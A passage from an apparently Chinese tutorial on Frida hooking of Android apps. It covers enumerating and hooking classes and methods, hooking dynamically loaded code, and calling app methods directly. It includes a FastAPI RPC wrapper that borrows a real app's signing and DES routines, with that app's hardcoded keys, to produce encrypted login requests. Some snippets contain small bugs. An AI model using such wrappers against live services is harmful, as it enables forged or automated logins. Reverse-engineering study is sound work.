function_">hooktest6</span>();</span><br></pre></td></tr></table></figure><h2 id="枚举已经加载的所有类与枚举类的所有方法">枚举已经加载的所有类与枚举类的所有方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//枚举已加载的所有类与枚举类的所有方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java.enumerateLoadedClasses(&#123;   回调</span></span><br><span class="line">        <span class="comment">//     onMatch: function(name, handle)&#123;</span></span><br><span class="line">        <span class="comment">//         if(name.indexOf(&quot;com.xiaojianbang.app&quot;) != -1)&#123;</span></span><br><span class="line">        <span class="comment">//             console.log(name);</span></span><br><span class="line">        <span class="comment">//             var clazz = Java.use(name);</span></span><br><span class="line">        <span class="comment">//             console.log(clazz);</span></span><br><span class="line">        <span class="comment">//             var methods = clazz.class.getDeclaredMethods();</span></span><br><span class="line">                    </span><br><span class="line">        <span class="comment">//             for(var i = 0; i &lt; methods.length; i++)&#123;</span></span><br><span class="line">        <span class="comment">//                 console.log(methods[i]);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment">//     &#125;,</span></span><br><span class="line">        <span class="comment">//     onComplete: function()&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> classes = <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>(); <span class="comment">//找到所有类存在classes</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classes.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(classes[i].<span class="title function_">indexOf</span>(<span class="string">&quot;com.xiaojianbang.app&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//找某个包</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.类的字节码</span></span><br><span class="line"><span class="comment">//  Class.forName(&#x27;com.xiaojianbang.app.xxxx&#x27;)</span></span><br><span class="line"><span class="comment">//  obj.getClass</span></span><br><span class="line"><span class="comment">//  xxxx.class</span></span><br><span class="line"><span class="comment">//getDeclaredMethods  获得所有方法 getMethods 获得public的方法</span></span><br></pre></td></tr></table></figure><h2 id="Hook类的所有方法">Hook类的所有方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hookAll</span>(<span class="params">md5, methodName</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; md5[methodName].<span class="property">overloads</span>.<span class="property">length</span>; k++)&#123;</span><br><span class="line">            md5[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> md5 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MD5&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> methods = md5.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="title function_">hookAll</span>(md5, methodName)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook动态加载的dex">Hook动态加载的dex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hook动态加载的dex</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//安卓7.0以上才可以用</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader; <span class="comment">//使用其他classloader加载类</span></span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Dynamic</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dynamic</span>);</span><br><span class="line">                        <span class="title class_">Dynamic</span>.<span class="property">sayHello</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hookTest9</span>();</span><br></pre></td></tr></table></figure><h2 id="map类型遍历与修改">map类型遍历与修改</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ShufferMap</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.ShufferMap&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(ShufferMap);</span></span><br><span class="line">        <span class="title class_">ShufferMap</span>.<span class="property">show</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">map</span>)&#123;</span><br><span class="line">            <span class="comment">//console.log(JSON.stringify(map));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Java map的遍历</span></span><br><span class="line">            <span class="keyword">var</span> key = map.<span class="title function_">keySet</span>();</span><br><span class="line">            <span class="keyword">var</span> it = key.<span class="title function_">iterator</span>();</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(it.<span class="title function_">hasNext</span>())&#123;</span><br><span class="line">                <span class="keyword">var</span>  keystr = it.<span class="title function_">next</span>();</span><br><span class="line">                <span class="keyword">var</span>  valuestr = map.<span class="title function_">get</span>(keystr);</span><br><span class="line">                result += valuestr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// map.put(&quot;pass&quot;, &quot;jingyi&quot;);</span></span><br><span class="line">            <span class="comment">// map.put(&quot;guanwang&quot;, &quot;bbs.125.la&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// var retval = this.show(map);</span></span><br><span class="line">            <span class="comment">// console.log(retval);</span></span><br><span class="line">            <span class="comment">// return retval;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook主动调用">Hook主动调用</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态方法的主动调用</span></span><br><span class="line">        <span class="keyword">var</span> str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> bytes = str.$new(<span class="string">&quot;xiaojianbang&quot;</span>).<span class="title function_">getBytes</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> rsa = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> retval = rsa.<span class="title function_">encrypt</span>(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> base64 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Base64&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = base64.<span class="title function_">encodeToString</span>(retval, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态方法的主动调用1 (新建一个对象去调用)</span></span><br><span class="line">        <span class="keyword">var</span> res = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>).$new(<span class="string">&quot;日元&quot;</span>, <span class="number">300000</span>).<span class="title function_">getInfo</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        res = utils.$new().<span class="title function_">myPrint</span>([<span class="string">&quot;xiaojianbang&quot;</span>, <span class="string">&quot;is very good&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;jingyi&quot;</span>, <span class="string">&quot;is very good&quot;</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态方法的主动调用2 (获取已有的对象调用)</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obj.<span class="property">_name</span>.<span class="property">value</span> == <span class="string">&quot;日元&quot;</span>)&#123;</span><br><span class="line">                    res = obj.<span class="title function_">getInfo</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida实现rpc">frida实现rpc</h2><ul><li>xjb第22课时</li><li>demo为第九课的嘟嘟牛</li><li>前置：了解了app关键算法</li></ul><ol><li><p>登录嘟嘟牛，同时使用charles进行抓包<img src="assets/image-20231126143811910.png" alt="image-20231126143811910"></p></li><li><p>发现关键输出Encrypt，使用frida的自吐算法脚本进行测试<br>命令 <code>frida -UF -l  frida_zitu.js com.dodonew.online</code></p><p>得到一堆数据，用charles抓到的包的数据在进行索引，如 ‘NIszaqFPos1vd0pFqKlB42Np5itPxaNH’</p><p>到如下位置<img src="assets/image-20231126143647286.png" alt="image-20231126143647286">可知这个app算法 doFinal结果如上图，向上可找到传进去的参数 doFinal参数</p><p>有个sig n，通过第九课的学习知道这个sign是通过app的关键函数md5加密而来，所以索引这个sign值看一下那个md5函数的参数<img src="assets/image-20231126144005343.png" alt="image-20231126144005343">如上图找到了参数</p><p>知道了两个关键函数RequestUtil.encodeDesMap和Utils.md5的参数和返回结果，可以写一个frida的rpc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jsCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function fridarpc(username,passward)&#123;</span></span><br><span class="line"><span class="string">    var result;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var time = new Date().getTime(); //获得timeStamp时间戳</span></span><br><span class="line"><span class="string">        //time = &#x27;1700980477428&#x27;;</span></span><br><span class="line"><span class="string">        //var passward = &#x27;930516iu&#x27;;</span></span><br><span class="line"><span class="string">        //var username = &#x27;13785674926&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var string =Java.use(&quot;java.lang.String&quot;);</span></span><br><span class="line"><span class="string">        var signData = string.$new(&#x27;equtype=ANDROID&amp;loginImei=Android352530080139520&amp;timeStamp=&#x27; + </span></span><br><span class="line"><span class="string">        time + &#x27;&amp;userPwd=&#x27; + passward +&#x27;&amp;username=&#x27;+ username +&#x27;&amp;key=sdlkjsdljf0j2fsjk&#x27;);</span></span><br><span class="line"><span class="string">        var utils = Java.use(&#x27;com.dodonew.online.util.Utils&#x27;);  //md5</span></span><br><span class="line"><span class="string">        var sign = utils.md5(signData).toUpperCase();</span></span><br><span class="line"><span class="string">        console.log(&quot;sign：&quot;,sign);  //输出sign值</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var requestUtil = Java.use(&#x27;com.dodonew.online.http.RequestUtil&#x27;);  //加密</span></span><br><span class="line"><span class="string">        var encryptDate = &#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352530080139520&quot;,&quot;sign&quot;:&quot;&#x27;+ </span></span><br><span class="line"><span class="string">        sign +&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;+ time +&#x27;&quot;,&quot;userPwd&quot;:&quot;&#x27;+ passward +&#x27;&quot;,&quot;username&quot;:&quot;&#x27;+ username +&#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        var Encrypt = requestUtil.encodeDesMap(encryptDate,&#x27;65102933&#x27;,&#x27;32028092&#x27;);</span></span><br><span class="line"><span class="string">        console.log(&quot;Encrypt：&quot;,Encrypt);</span></span><br><span class="line"><span class="string">        result = Encrypt;  </span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">rpc.exports=&#123;</span></span><br><span class="line"><span class="string">    zxk1ng:fridarpc</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用frida脚本</span></span><br><span class="line">process = frida.get_device_manager().add_remote_device(<span class="string">&#x27;192.168.100.83:27042&#x27;</span>).attach(<span class="string">&quot;com.dodonew.online&quot;</span>)</span><br><span class="line">script = process.create_script(jsCode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Running 小肩膀&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get&quot;</span></span>) </span><span class="comment">#注意这里url上没有定义参数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getEchoApi</span>(<span class="params">item_id, item_user, item_pass</span>):</span><br><span class="line">    <span class="comment">#fastapi会聪明的发现它不是URL参数,然后自动将他识别为param参数</span></span><br><span class="line">    <span class="comment">#RPC远程调用</span></span><br><span class="line">    result = script.exports.zxk1ng(item_user, item_pass)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item_retval&quot;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, port = <span class="number">8080</span>)</span><br><span class="line">Hook</span><br></pre></td></tr></table></figure></li></ol><h2 id="参数是数组类型的Hook姿势">参数是数组类型的Hook姿势</h2><p>实例如下图</p><p><img src="assets/image-20240628140526720.png" alt="image-20240628140526720"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Character Java.use(&quot;java.lang.Character&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当参数是char数组时 ==》Arrays.toString(arr[i])</span></span><br><span class="line">function <span class="title function_">charArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[C&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*进行参数修改</span></span><br><span class="line"><span class="comment">            var myarg=Java.array(&#x27;char&#x27;,[&#x27;1&#x27;,&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">            var result=this.toString(myarg);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;char&#x27;</span>,arg); <span class="comment">//转化为char类型的数 组</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>.toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(str,result);</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当参数是byte数组时 ==》Arrays.toString(Arrays.toString(arr[i]).getBytes())</span></span><br><span class="line">function <span class="title function_">bytesArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">/*使用r0gson.dex</span></span><br><span class="line"><span class="comment">        var gson=Java.openClassFile(&quot;/data/local/tmp/r0gson.dex&quot;).load();</span></span><br><span class="line"><span class="comment">        var gson=Java.use(&quot;com.r0ysue.gson.Gson&quot;);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[B&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;byte&#x27;</span>,arg); <span class="comment">//转化为char类型的数组</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>,toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(<span class="string">&quot;[1]&quot;</span>,str);</span><br><span class="line">            console.log(<span class="string">&quot;[2]&quot;</span>,JSON.stringify(arg));</span><br><span class="line">            console.log(<span class="string">&quot;[3]&quot;</span>,gson.$<span class="keyword">new</span>().toJson(arg)); <span class="comment">//使用r0gson.dex</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;);</span></span><br><span class="line"><span class="comment">console.log(&quot;[4]&quot;,ByteString.of(arg).hex());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法5 申请空间 写入内存 再hexdump </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Java类型类型打印">Java类型类型打印</h2><p><img src="assets/image-20240628161004005.png" alt="image-20240628161004005"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 